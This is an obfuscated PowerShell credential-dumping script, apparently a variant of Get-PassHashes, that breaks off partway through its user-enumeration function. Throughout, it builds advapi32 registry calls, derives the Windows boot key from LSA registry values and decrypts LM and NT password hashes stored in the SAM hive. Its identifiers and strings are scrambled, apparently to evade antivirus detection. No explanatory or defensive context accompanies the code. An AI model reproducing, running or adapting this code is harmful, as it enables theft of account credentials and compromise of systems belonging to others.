  SEt-VarIaBLE 80vI  ( [tyPe]("{0}{1}{2}"-f 'ap','pdo','MAiN')  );   sV Eq906  ( [tYpE]("{6}{1}{7}{5}{2}{4}{3}{0}{8}" -F'r','FLEcTi','SSe','LYbUildE','mB','.a','re','On.EmIT','accESs'));  SEt-vARiABlE ("Bl2"+"q") (  [tYpe]("{1}{6}{3}{2}{0}{4}{5}"-F'SerVIcES.cH','RuN','INTErOP','.','aRS','et','tIME') );   SeT  ('U'+'30')  (  [TyPe]("{1}{0}"-f 'Nt','I')) ;   SEt  BHvZ78  ( [type]("{2}{4}{3}{5}{9}{6}{0}{8}{1}{7}{10}"-F'eR','C','R','Time.I','Un','nte','PS','ES.C','vI','RO','AlLINgcOnveNTiON')  );   sET ('s'+'kojcd') (  [tYPe]("{4}{6}{0}{2}{1}{3}{5}{7}" -f 'ime.InTEroP','eS.DL','SeRvIc','LIMPo','r','Rt','UnT','AttRibuTe')  ) ;  SET-iTEM  vAriAbLE:Yg34 (  [typE]("{0}{1}" -f'mAT','h') ); Sv z308  ( [TyPE]("{3}{4}{9}{7}{2}{5}{1}{0}{6}{8}"-f 'CipHe','pHY.','OGr','sE','cUR','a','Rm','.crYPT','odE','ITy')) ;   seT-Item  VARiaBLe:YsONzR  ( [tYpe]("{3}{1}{2}{5}{6}{4}{0}" -f'E','RiTY.c','Rypt','SeCu','GMOd','OgrAPHY','.paddin'));  SeT-VarIAble  Bk8dM2 ( [TyPE]("{1}{0}" -f 'RInG','ST'));    $Lt4RQ =  [TypE]("{0}{4}{1}{3}{2}"-F 'tex','.','INg','encod','t') ;  sv  ("Z"+"Js")  ( [tyPE]("{1}{0}{3}{4}{2}"-f 'URITy.cRyP','SEc','D5','Tog','raPHY.M')  )  ; $6iWXPA= [TYpe]("{1}{0}"-F 'rt','Conve');  Set-iTeM VaRiaBlE:guXP ( [Type]("{0}{1}{2}"-F 'b','i','tconVeRTer')) ;  sET-ItEM  ('V'+'AriA'+'B'+'Le:1iy'+'OK') ([typE]("{4}{5}{7}{6}{8}{2}{1}{3}{0}"-F'TITy','NDOWsID','l.Wi','eN','sECuRi','TY','N','.PRi','ciPA')) ;  sET 76HUwG (  [type]("{2}{4}{3}{1}{0}" -F 'Y','REGISTR','miCr','OfT.WiN32.','Os') )  ; Sv ("g"+"TxE5"+"h")  ( [TYPE]("{1}{0}{6}{4}{2}{7}{3}{5}"-f'rOsoFt','Mic','stR','m','eGI','issionchEcK','.wIn32.R','yKeypER'));    set-ITeM  ("v"+"aRI"+"aBLe:FOL21")  (  [tYPe]("{9}{0}{1}{3}{2}{10}{8}{6}{7}{4}{5}" -F 'y','STem.SECu','y.AcCESSCo','rIT','Rig','HTs','L.rEgis','trY','TrO','S','n')  ) ;  seT-VArIabLE A94xt  ([type]("{11}{10}{0}{7}{6}{2}{1}{8}{5}{3}{4}{9}"-F 'iNcI','d','In','i','DE','s','L.w','pa','oW','nTitY','TeM.sEcurItY.pR','sYS') ); function gE`T-PasSH`AS`h`Es { 
 
[CmdletBinding()]
Param (
    [Switch]${P`soBj`e`cTfoRMAT}
)

${SCRip`T:P`O`wErDUMp} = ${Nu`ll}
function loAdA`Pi
{
    
    ${DyN`A`s`SEMBlY} = &("{1}{0}{2}"-f'Obje','New-','ct') ("{5}{1}{2}{0}{4}{8}{7}{3}{6}"-f'.Reflecti','ste','m','ly','o','Sy','Name','ssemb','n.A')(("{1}{0}"-f '2Lib','Win3'))
    ${AsS`E`M`Bly`BuILD`eR} =  (  VAriabLe  80VI )."VAl`uE"::"CU`R`R`EnTdOMA`in".("{1}{2}{4}{3}{0}{5}"-f 'Dynam','D','e','ne','fi','icAssembly').Invoke(${DY`NAs`S`embly},  ( vaRIaBle  Eq906  -vAlUEONL  )::"r`un")
    ${moDu`l`EbU`ILd`er} = ${ASS`EMBl`ybU`IldEr}.("{0}{2}{1}{3}"-f 'Defi','icMod','neDynam','ule').Invoke(("{0}{1}{2}" -f 'W','in3','2Lib'), ${fa`LSe})
    ${t`y`PeBuI`LdeR} = ${m`odU`LebUiLd`er}.("{1}{0}{2}" -f 'Ty','Define','pe').Invoke(("{0}{1}" -f 'Powe','rDump'), ("{0}{2}{1}"-f'Pub','Class','lic, '))

    
    
    
    ${PIn`Voke`MethOd} = ${T`YPE`BUILDEr}.("{3}{1}{0}{2}" -f 'in','ef','eMethod','D').Invoke(
        ("{0}{1}{3}{2}"-f'Reg','OpenKe','x','yE'),
        [Reflection.MethodAttributes] ("{0}{1}{2}"-f'P','ublic, Sta','tic'),
        [int],
        [Type[]] @( [int], [string], [int], [int],  ( VARiABLe ("u"+"30") )."val`UE".("{2}{1}{0}{3}" -f'RefTyp','keBy','Ma','e').Invoke())
    )

    ${dl`lIMpo`RtcONS`T`RuctoR} =  ( VaRIabLe ("sKOjc"+"d") -vA)."geTC`OnsTrUc`T`or"(@([String]))

    ${FIelD`A`R`RAy} = [Reflection.FieldInfo[]] @(
          $SKOJcd.("{2}{0}{1}" -f'iel','d','GetF').Invoke(("{0}{1}{2}"-f 'En','tryP','oint')),
          $sKojCD.("{2}{1}{0}"-f'eld','i','GetF').Invoke(("{1}{0}"-f'arSet','Ch'))
    )
    ${fI`E`ldvaLUe`A`RrAY} = [Object[]] @(
        ("{0}{1}{2}"-f'RegOp','enKey','Ex'),
          (DIR ('vAr'+'i'+'AblE:Bl2Q'))."v`AlUe"::"a`uTO"
    )

    ${SeTL`A`s`TeR`R`oRCusTomATT`RibutE} = &("{1}{2}{0}{3}"-f'bjec','New-','O','t') ("{4}{3}{0}{2}{5}{1}{6}" -f'flectio','buteBui','n.Emit.Custo','e','R','mAttri','lder')(
        ${dll`I`M`P`oR`Tco`NStRUctOR},
        @(("{0}{3}{1}{2}" -f'a','dl','l','dvapi32.')),
        ${FI`El`dAr`RaY},
        ${fIE`LdV`A`lueaR`RAY}
    )
    ${p`INVO`KEMetHOd}.("{3}{1}{2}{0}"-f 'ibute','etCustom','Attr','S').Invoke(${sEtLAsTerR`oR`Custo`m`AtTrI`BUTe})
    
    
    
    ${pinvO`k`e`mEtHoD} = ${TypEBuI`l`dEr}.("{2}{3}{1}{0}" -f 'd','ineMetho','D','ef').Invoke(
        ("{1}{0}{2}{3}" -f 'yIn','RegQuer','f','oKey'),
        [Reflection.MethodAttributes] ("{2}{3}{4}{0}{1}"-f 'Stat','ic','Pub','l','ic, '),
        [int],
        [Type[]] @( [int], [Text.Stringbuilder],   $u30.("{3}{0}{1}{2}" -f 'ByR','efT','ype','Make').Invoke(), [int],   ( itEM VaRiabLe:u30)."Va`luE".("{3}{2}{0}{1}{4}"-f'R','efTy','By','Make','pe').Invoke(),   (VariAbLE  ('u3'+'0') -VaLuEO  ).("{1}{2}{3}{0}"-f'pe','MakeB','yRe','fTy').Invoke(),   (gEt-vaRIaBle ('u3'+'0')  )."v`ALUE".("{0}{2}{1}{3}"-f 'Ma','eByRefTyp','k','e').Invoke(),   (ChIlditem vArIable:U30  )."Va`Lue".("{3}{2}{4}{1}{0}" -f 'e','ByRefTyp','a','M','ke').Invoke(),  (diR vARIaBlE:u30)."va`LuE".("{1}{2}{0}{3}"-f'y','MakeBy','RefT','pe').Invoke(),  $U30.("{3}{1}{0}{2}"-f 'f','akeByRe','Type','M').Invoke(),  $U30.("{0}{1}{2}" -f'MakeB','yRefTyp','e').Invoke(), [IntPtr])
    )

    ${DLL`iMpO`R`TCO`N`STR`UCtOR} =  (vaRiaBlE ("S"+"KOjC"+"D"))."v`AlUe"."GeT`COn`STR`ucTor"(@([String]))

    ${f`IELD`A`RRaY} = [Reflection.FieldInfo[]] @(
         $sKojcD.("{1}{0}{2}" -f 'etFie','G','ld').Invoke(("{0}{1}{2}" -f'Entr','yPoin','t')),
          (  GI  vaRiabLE:skOjCD )."V`ALuE".("{1}{2}{0}" -f'd','GetFi','el').Invoke(("{1}{2}{3}{0}"-f'ntion','Call','ingCo','nve')),
         (dIR ("Va"+"RiABLe:SK"+"OJC"+"D") )."va`LuE".("{1}{2}{0}" -f 'ield','Get','F').Invoke(("{3}{1}{2}{0}"-f'ror','etLa','stEr','S'))
    )
    ${FIELD`V`ALUe`ARRaY} = [Object[]] @(
        ("{2}{1}{0}" -f'y','foKe','RegQueryIn'),
          $bhvz78::"W`iN`APi",
        ${T`RUE}
    )

    ${se`Tl`A`ST`ErrO`RcusT`omAttrIbUTe} = &("{1}{2}{0}"-f 't','Ne','w-Objec') ("{2}{7}{4}{0}{1}{10}{5}{11}{8}{3}{9}{6}"-f 'E','mit.CustomAttr','Reflec','ui','.','b','er','tion','B','ld','i','ute')(
        ${DLLimPOR`Tco`NS`TRUcT`or},
        @(("{3}{1}{0}{2}"-f 'i','vap','32.dll','ad')),
        ${FIe`l`DARRaY},
        ${FiElD`VA`l`uEa`RrAY}
    )
    ${PIN`VoKemE`T`HOD}.("{0}{3}{1}{2}" -f'SetCusto','Att','ribute','m').Invoke(${setL`ASt`ERro`Rc`US`ToMaTtRIbuTe})
    
    
    
    ${p`i`NvOkemETH`od} = ${Ty`PEB`uIl`deR}.("{2}{0}{1}{3}" -f'fi','neM','De','ethod').Invoke(
        ("{2}{0}{1}" -f'egCl','oseKey','R'),
        [Reflection.MethodAttributes] ("{2}{3}{0}{1}"-f'i','c','Publ','ic, Stat'),
        [int],
        [Type[]] @( [int])
    )

    ${d`LlIMpoRTCONs`TRu`c`Tor} =   $SKoJCd."Get`C`OnStr`UCt`OR"(@([String]))

    ${f`ielDa`R`RAy} = [Reflection.FieldInfo[]] @(
         (IteM  ('va'+'Ria'+'Ble:sk'+'OJcd') )."VAL`UE".("{0}{1}{2}" -f 'G','etFie','ld').Invoke(("{1}{2}{0}" -f't','En','tryPoin')),
         ( get-chILdITem  ('VaRiaBL'+'e:'+'Skoj'+'cd'))."VA`LuE".("{0}{2}{1}"-f'Ge','ield','tF').Invoke(("{2}{3}{0}{1}" -f'Erro','r','SetLas','t'))
    )
    ${fIE`ld`VaL`Ue`ArRaY} = [Object[]] @(
        ("{0}{1}{3}{2}" -f'R','egClo','ey','seK'),
        ${T`RUe}
    )

    ${SEt`La`sterr`OR`cUsTomAttr`iB`U`Te} = &("{2}{1}{0}"-f't','bjec','New-O') ("{3}{10}{7}{0}{5}{8}{9}{2}{1}{4}{6}" -f 'i','m','to','Ref','AttributeBui','t','lder','tion.Em','.Cu','s','lec')(
        ${DllI`M`pORt`consTr`u`cT`OR},
        @(("{2}{0}{1}"-f'pi3','2.dll','adva')),
        ${FI`elD`Ar`RaY},
        ${FieLD`VA`luE`ARRAy}
    )
    ${Pi`NvoK`Em`EthOD}.("{0}{3}{4}{1}{2}{5}" -f'S','Att','ribu','et','Custom','te').Invoke(${sET`LastEr`RO`RCUStO`ma`T`TRIBU`TE})
    
    
    ${SCrip`T:p`oW`er`DU`MP} = ${TYpe`BU`ild`eR}.("{1}{0}{2}" -f'ateT','Cre','ype').Invoke()
}



${A`NTP`A`ssWOrD} =  ( VarIabLE Lt4rQ -VaLuEo  )::"AS`ciI".("{0}{1}" -f'G','etBytes').Invoke("NTPASSWORD`0");
${ALmP`ASs`W`ord} =   ( gi VARiAblE:LT4Rq)."VA`lUe"::"asC`II".("{0}{1}{2}"-f 'GetByt','e','s').Invoke("LMPASSWORD`0");
${EM`p`Ty_Lm} = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
${EmPt`y_nt} = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
${Odd`_pAr`ITy} = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function siD_`TO_`keY(${s`ID})
{
    ${c0} = ${s`ID} -band 255
    ${C1} = (${s`ID} -band 65280)/256
    ${c`2} = (${s`Id} -band 16711680)/65536
    ${C3} = (${S`Id} -band 4278190080)/16777216

    ${S1} = @(${C0}, ${C`1}, ${C2}, ${C`3}, ${c0}, ${C1}, ${c`2})
    ${s2} = @(${c`3}, ${c0}, ${C1}, ${c2}, ${c`3}, ${c0}, ${C`1}) 

    return ,((&("{0}{2}{3}{1}"-f's','y','tr_to_k','e') ${S`1}),(&("{2}{1}{3}{0}" -f'ey','r_to_','st','k') ${s2}))
}

function STR`_To_`KeY(${S})
{
    ${k0} = [int] (ITeM  ("Va"+"riA"+"Bl"+"E:"+"Yg34") )."Va`lUE"::"FLO`Or"(${s}[0] * 0.5)
    ${K1} = ( $(${s}[0] -band 0x01) * 64) -bor [int] ( GET-VaRiaBlE  ('YG3'+'4') )."VAL`Ue"::"f`lOOr"(${s}[1] * 0.25)
    ${k2} = ( $(${S}[1] -band 0x03) * 32) -bor [int] (gi  ('vARI'+'a'+'B'+'LE'+':YG34')  )."vAl`UE"::"F`lOoR"(${S}[2] * 0.125)
    ${k3} = ( $(${S}[2] -band 0x07) * 16) -bor [int]  (GeT-iTEM VaRiabLE:Yg34 )."Val`Ue"::"f`lOoR"(${S}[3] * 0.0625)
    ${K4} = ( $(${S}[3] -band 0x0F) * 8) -bor [int] $Yg34::"F`LoOR"(${s}[4] * 0.03125)
    ${k5} = ( $(${S}[4] -band 0x1F) * 4) -bor [int]  (  geT-VaRiable  ("Y"+"g34")  -VAL )::"fLO`Or"(${s}[5] * 0.015625)
    ${K`6} = ( $(${S}[5] -band 0x3F) * 2) -bor [int] $Yg34::"Fl`OOr"(${S}[6] * 0.0078125)
    ${K`7} = $(${s}[6] -band 0x7F)

    ${k`EY} = @(${k0}, ${k1}, ${k2}, ${K3}, ${K4}, ${K5}, ${k6}, ${k7})

    0..7 | &('%'){
        ${K`ey}[${_}] = ${OdD_PA`R`I`TY}[(${k`Ey}[${_}] * 2)]
    }

    return ,${K`EY}
}

function new`Rc4([byte[]]${k`ey})
{
    return &("{2}{3}{0}{1}"-f 'je','ct','new-o','b') ("{0}{1}" -f 'Obj','ect') |
    &("{3}{2}{1}{0}"-f 'r','Membe','dd-','A') ("{1}{2}{0}"-f 'teProperty','N','o') ("{0}{1}" -f'k','ey') ${K`ey} -PassThru |
    &("{3}{2}{0}{1}"-f'Membe','r','-','Add') ("{1}{2}{0}{3}" -f'opert','Not','ePr','y') ('S') ${nu`ll} -PassThru |
    &("{2}{0}{1}"-f'dd-Membe','r','A') ("{2}{0}{1}"-f'e','thod','ScriptM') ("{0}{1}" -f'ini','t') {
        if (-not ${T`hiS}."S")
        {
            [byte[]]${tH`iS}."S" = 0..255;
            0..255 | &('%') -begin{[long]${J}=0;}{
                ${J} = (${j} + ${T`hIs}."K`eY"[$(${_} % ${tH`iS}."K`Ey"."LeNg`Th")] + ${T`hiS}."S"[${_}]) % ${T`His}."s"."len`GTh";
                ${T`EMP} = ${TH`IS}."s"[${_}]; ${th`iS}."S"[${_}] = ${t`HIs}."S"[${J}]; ${TH`Is}."s"[${j}] = ${te`mP};
                }
        }
    } -PassThru |
    &("{2}{1}{0}"-f 'Member','-','Add') ("{2}{0}{1}" -f'pt','Method','Scri') ("{2}{1}{0}"-f'pt','y','encr') {
        ${DA`Ta} = ${A`Rgs}[0];
        ${TH`is}.("{1}{0}" -f 'nit','i').Invoke();
        ${OUT`BuF} = &("{2}{0}{1}" -f'ec','t','new-obj') ("{1}{0}" -f '[]','byte') $(${da`Ta}."lE`NgtH");
        ${S2} = ${TH`iS}."s"[0..${th`is}."S"."l`En`GTH"];
        0..$(${d`ATa}."l`e`NGTH"-1) | &('%') -begin{${i}=0;${j}=0;} {
            ${I} = (${I}+1) % ${s2}."le`NGTH";
            ${J} = (${J} + ${s`2}[${i}]) % ${s2}."lEn`GTh";
            ${T`EMp} = ${S2}[${i}];${S`2}[${i}] = ${S`2}[${j}];${S2}[${j}] = ${T`eMp};
            ${A} = ${dA`TA}[${_}];
            ${B} = ${S`2}[ $(${s2}[${I}]+${S`2}[${J}]) % ${s`2}."Le`N`gtH" ];
            ${ouTb`UF}[${_}] = (${a} -bxor ${b});
        }
        return ,${O`u`TBUf};
    } -PassThru
}

function Des_`E`Ncry`PT([byte[]]${d`Ata}, [byte[]]${k`Ey})
{
    return ,(&("{0}{1}{3}{2}" -f'de','s','nsform','_tra') ${d`ATa} ${k`eY} ${T`Rue})
}

function D`Es_d`EcRypt([byte[]]${D`ATA}, [byte[]]${k`eY})
{
    return ,(&("{2}{1}{0}" -f'orm','nsf','des_tra') ${D`ATA} ${k`ey} ${F`Al`SE})
}

function deS`_TrAn`S`FoRM([byte[]]${D`AtA}, [byte[]]${K`eY}, ${DO`eN`Crypt})
{
    ${d`es} = &("{2}{0}{1}"-f 'je','ct','new-ob') ("{4}{5}{1}{3}{7}{8}{2}{6}{0}"-f'rviceProvider','ity.Cr','SCryp','yptog','Se','cur','toSe','raph','y.DE');
    ${D`ES}."M`oDe" =  (  CHIlDITeM vaRiAbLe:Z308  )."vA`Lue"::"e`cB";
    ${D`eS}."PADDi`Ng" =   (  get-VarIabLE  YsONzr)."va`LuE"::"N`one";
    ${d`Es}."K`eY" = ${k`EY};
    ${D`ES}."Iv" = ${K`Ey};
    ${TR`AnSF`oRm} = ${N`ull};
    if (${D`Oe`NCRypt}) {${t`RAnsfo`RM} = ${d`es}.("{2}{3}{0}{1}"-f'eEncr','yptor','Cr','eat').Invoke();}
    else{${Tr`ANS`FoRM} = ${d`eS}.("{3}{1}{0}{2}" -f'eD','reat','ecryptor','C').Invoke();}
    ${rES`uLT} = ${tR`A`Ns`FORM}.("{1}{0}{2}{3}" -f'formF','Trans','inalB','lock').Invoke(${da`TA}, 0, ${dA`TA}."lENg`Th");
    return ,${R`es`ulT};
}

function Get`-R`EgKe`YclA`SS([string]${K`ey}, [string]${SuBK`EY})
{
    switch (${k`Ey}) {
        ("{0}{1}"-f'HKC','R') { ${nk`ey} = 0x80000000} 
        ("{0}{1}"-f 'H','KCU') { ${n`kEY} = 0x80000001} 
        ("{0}{1}" -f 'HK','LM') { ${n`KEy} = 0x80000002} 
        "HKU"  { ${Nk`EY} = 0x80000003} 
        ("{1}{0}"-f'CC','HK') { ${n`Key} = 0x80000005} 
        ("{1}{0}"-f'ult','defa') {
            throw ("{9}{14}{0}{12}{11}{3}{18}{4}{8}{5}{7}{20}{17}{1}{6}{15}{10}{16}{13}{2}{19}" -f'li','opt','U, HK','y.','se','ollo','ions ','wi',' one of the f','In',' H','e','d K',' HKLM, HK','va','HKCR,','KCU,','g ',' U','CC','n')
        }
    }
    ${KEYQU`E`RY`Va`lUe} = 0x1;
    ${K`EYr`Ead} = 0x19;
    ${kE`y`AlLAC`CESS} = 0x3F;
    ${RE`sult} = "";
    [int]${hk`Ey}=0
    if (-not ${sc`RiP`T`:pOWERD`UmP}::"RegoP`ENk`eyeX"(${n`KEY},${sUB`KEY},0,${Ke`Y`REad},[ref]${H`KEY}))
    {
    	${c`l`ASSvAL} = &("{2}{3}{0}{1}" -f 'c','t','New-O','bje') ("{3}{1}{4}{5}{2}{0}"-f 'ilder','ext.','u','T','String','b') 1024
    	[int]${L`EN} = 1024
    	if (-not ${SCrIPt:`PoWe`RD`uMP}::"REgQU`ErYiN`Fok`Ey"(${h`kEy},${clAss`VAL},[ref]${L`En},0,[ref]${n`ULL},[ref]${NU`Ll},
    		[ref]${NU`lL},[ref]${n`UlL},[ref]${n`uLL},[ref]${N`uLL},[ref]${nU`Ll},0))
    	{
    		${r`esUlt} = ${Cla`s`sVAl}.("{2}{1}{0}"-f 'ng','ri','ToSt').Invoke()
    	}
    	else
    	{
    		&("{1}{0}{2}{3}" -f 'ri','W','te-E','rror') ("{2}{5}{6}{0}{3}{4}{1}" -f'y','iled','Re',' ','fa','gQ','ueryInfoKe');
    	}
    	${ScripT:p`OW`eR`DumP}::("{3}{1}{0}{2}" -f'o','Cl','seKey','Reg').Invoke(${h`KeY}) | &("{1}{0}{2}" -f'l','Out-Nu','l')
    }
    else
    {
    	&("{0}{2}{1}" -f'Wri','or','te-Err') ("{3}{2}{0}{1}{4}"-f ' ','open ','t','Canno','key');
    }
    return ${r`ES`ulT};
}

function Get`-bo`ot`key
{
    ${s} =   ( get-varIABLe  Bk8DM2 )."Va`lUe"::("{0}{1}" -f'J','oin').Invoke("",$("JD",("{0}{1}" -f'Sk','ew1'),"GBG",("{1}{0}"-f'ata','D') | &('%'){&("{1}{3}{0}{2}" -f'egKeyCl','Get','ass','-R') ("{1}{0}" -f'KLM','H') "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    ${B} = &("{1}{2}{0}" -f 'ect','new-','obj') ("{1}{0}"-f'te[]','by') $(${s}."LeN`GTh"/2);
    0..$(${B}."lENG`Th"-1) | &('%'){${b}[${_}] =  $6iwxPA::("{0}{1}"-f 'ToBy','te').Invoke(${s}.("{2}{0}{1}" -f 'tr','ing','Subs').Invoke($(${_}*2),2),16)}
    ${b2} = &("{0}{2}{1}"-f'ne','bject','w-o') ("{0}{2}{1}"-f'by','[]','te') 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | &('%') -begin{${i}=0;}{${B`2}[${I}]=${B}[${_}];${I}++}
    return ,${b2};
}

function G`e`T-h`BooTkEY
{
    param([byte[]]${Boo`T`key});
    ${AqW`e`RTY} =  (gET-VarIaBlE  ("L"+"T4Rq")  )."v`ALUE"::"as`cIi".("{2}{0}{1}"-f 'Byte','s','Get').Invoke("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    ${a`NUM} =  ( gi vARiABle:lt4Rq)."val`Ue"::"AS`cii".("{1}{2}{0}" -f 'Bytes','Ge','t').Invoke("0123456789012345678901234567890123456789`0");
    ${k} = &("{0}{1}"-f'Ge','t-Item') (("{2}{7}{0}{8}{3}{1}{5}{6}{4}"-f ':LBPS','AMLBP','HKL','PS','ount','Doma','insLBPAcc','M','AMLB'))."R`e`PLAcE"(([CHAR]76+[CHAR]66+[CHAR]80),'\');
    if (-not ${K}) {return ${N`uLL}}
    [byte[]]${F} = ${K}.("{0}{1}"-f 'GetV','alue').Invoke("F");
    if (-not ${f}) {return ${N`Ull}}
    ${r`c4k`eY} =   (  gET-varIAble  ("Zj"+"s"))."V`Alue"::("{1}{0}"-f 'eate','Cr').Invoke()."CO`mp`UTeH`Ash"(${F}[0x70..0x7F] + ${AQw`e`RTY} + ${BO`O`Tkey} + ${A`Num});
    ${r`C4} = &("{1}{0}" -f 'ewRC4','N') ${Rc`4K`EY};
    return ,(${R`C4}."E`NC`RYPT"(${F}[0x80..0x9F]));
}

function G`et`-USernAME([byte[]]${V})
{
    if (-not ${v}) {return ${n`ull}};
    ${o`FFSEt} =  (lS  ("v"+"ARi"+"ablE:"+"GuXp")  )."vAL`ue"::"to`IN`T32"(${V}[0x0c..0x0f],0) + 0xCC;
    ${l`en} =  (ChILdIteM  ("VARiA"+"blE:G"+"U"+"XP")  )."va`lUe"::"t`OInT`32"(${v}[0x10..0x13],0);
    return   (  vaRIable  LT4RQ  -vALUeOnlY  )::"Uni`co`dE".("{1}{2}{0}"-f'String','G','et').Invoke(${V}, ${O`Ff`SeT}, ${l`EN});
}

function GEt-uSE`RHA`s`HES(${u}, [byte[]]${HbOO`T`KEy})
{
    [byte[]]${eNC_`Lm_`H`ASH} = ${n`ulL}; [byte[]]${eNC_Nt_`h`Ash} = ${n`ull};
    
    
    ${l`M_E`xiS`Ts} = ${f`AlSE};
    ${NT`_ex`IStS} = ${F`Al`Se};
    
    if (${u}."v"[0xa0..0xa3] -eq 20)
    {
        ${l`m_EX`is`TS} = ${tR`ue};
    }
    
    elseif (${U}."V"[0xac..0xaf] -eq 20)
    {
        ${NT_`E`XIsTS} = ${t`RuE};
    }

    if (${lM_`E`XIS`TS} -eq ${Tr`ue})
    {
        ${lm_`h`ASH_`offsET} = ${U}."H`AshOf`FS`et" + 4;
        ${nT_hAsh`_O`Ff`s`ET} = ${u}."H`AShoFf`seT" + 8 + 0x10;
        ${E`N`C_Lm_HAsH} = ${u}."V"[$(${L`m_`hash`_`OFfseT})..$(${l`m`_HAsH_O`FfSet}+0x0f)];
        ${enC`_n`T_`hASH} = ${U}."v"[$(${n`T_h`AS`h_OFf`SEt})..$(${Nt_H`AsH`_O`FfS`et}+0x0f)];
    }
	
    elseif (${N`T_`exisTS} -eq ${T`RUe})
    {
        ${nT_ha`sH_OFF`s`ET} = ${U}."Ha`sh`OffS`eT" + 8;
        ${enc_`NT_`H`AsH} = [byte[]]${u}."V"[$(${nt`_H`AsH_O`FfSeT})..$(${nT_HaS`h_O`Ffset}+0x0f)];
    }
    return ,(&("{2}{0}{1}" -f'crypt','Hashes','De') ${u}."r`Id" ${eNC`_lm_hA`sH} ${En`c_Nt_`HA`SH} ${hBO`ot`Key});
}

function De`C`RyPt`HaSh`eS(${r`ID}, [byte[]]${E`Nc_l`M_Hash}, [byte[]]${EN`c_n`T_ha`Sh}, [byte[]]${Hb`OOt`key})
{
    [byte[]]${lM`Ha`SH} = ${e`M`Pty_Lm}; [byte[]]${Nt`hA`sH}=${eMPT`Y`_Nt};
    
    if (${E`NC`_`lM_haSH})
    {
        ${LMH`Ash} = &("{0}{3}{1}{2}" -f'De','pt','SingleHash','cry') ${r`Id} ${hB`o`o`Tkey} ${eNC`_lM`_HasH} ${Al`mPA`SswoRD};
    }

    
    if (${E`NC_N`T_H`Ash})
    {
        ${nTh`Ash} = &("{2}{3}{0}{1}"-f 'ptSin','gleHash','De','cry') ${r`Id} ${hbO`O`Tkey} ${E`NC_`NT_Ha`SH} ${A`NTPA`S`SworD};
    }

    return ,(${LM`H`Ash},${N`T`HASH})
}

function DEcrY`Pt`sIN`Gl`EHaSH(${R`ID},[byte[]]${H`BOOT`KEy},[byte[]]${E`NC_`HASH},[byte[]]${L`MNtsTr})
{
    ${d`esKE`Ys} = &("{2}{1}{0}" -f 'key','to_','sid_') ${R`iD};
    ${M`D5} =   ( gci  ('VaRiaB'+'l'+'e:ZJS') )."v`Alue"::("{0}{2}{1}" -f 'Crea','e','t').Invoke();
    ${rc`4_k`Ey} = ${M`D5}."COMp`uTEH`A`sh"(${H`BOO`TKeY}[0..0x0f] +  ( get-IteM ('vaRiaBlE'+':G'+'Uxp')  )."va`lUe"::("{1}{0}"-f's','GetByte').Invoke(${r`Id}) + ${L`M`NtStR});
    ${R`C4} = &("{1}{0}" -f 'ewRC4','N') ${rC4`_K`eY};
    ${o`BF`kEy} = ${r`c4}.("{0}{2}{1}"-f'en','ypt','cr').Invoke(${EN`C_H`ASH});
    ${HA`SH} = (&("{0}{1}{2}"-f 'de','s_dec','rypt')  ${oBF`K`eY}[0..7] ${dEsKe`YS}[0]) +
        (&("{0}{1}{2}"-f 'd','es_d','ecrypt') ${o`B`FKEY}[8..$(${OBf`kEy}."LenG`TH" - 1)] ${dE`s`kEYs}[1]);
    return ,${H`AsH};
}

function G`ET`-USerKeYS
{
    &('ls') ((("{3}{6}{5}{8}{1}{2}{0}{7}{4}{9}" -f's{0}Ac','omai','n','HKLM:','nt{0}Use','0}SAM{0}SAM{0','{','cou','}D','rs'))  -F[cHaR]92) |
        &("{0}{1}" -f 'w','here') {${_}."PSCH`i`Ldn`AMe" -match "^[0-9A-Fa-f]{8}$"} |
            &("{3}{0}{1}{2}" -f'd-','Membe','r','Ad') ("{1}{4}{3}{2}{0}"-f 'y','Al','pert','asPro','i') ("{0}{2}{1}" -f'KeyN','me','a') ("{0}{1}{2}" -f'PS','ChildNa','me') -PassThru |
            &("{0}{2}{1}" -f'Add-Mem','er','b') ("{1}{2}{3}{0}" -f 'roperty','Sc','r','iptP') ("{1}{0}" -f'd','Ri') { (Gci ("va"+"riAbLE:"+"6iW"+"xp"+"a")  )."va`LUE"::("{0}{1}"-f 'ToInt3','2').Invoke(${T`HiS}."PSChI`LDnA`Me", 16)} -PassThru |
            &("{0}{2}{1}{3}" -f'Ad','-Mem','d','ber') ("{1}{3}{0}{2}" -f'roper','Scr','ty','iptP') ('V') {[byte[]](${T`hiS}.("{2}{1}{0}"-f 'ue','l','GetVa').Invoke("V"))} -PassThru |
            &("{1}{2}{0}" -f 'r','Ad','d-Membe') ("{3}{1}{2}{0}" -f'ty','r','iptProper','Sc') ("{2}{0}{1}"-f 'serN','ame','U') {&("{2}{1}{0}" -f 'serName','-U','Get')(${Th`iS}.("{0}{1}"-f'Get','Value').Invoke("V"))} -PassThru |
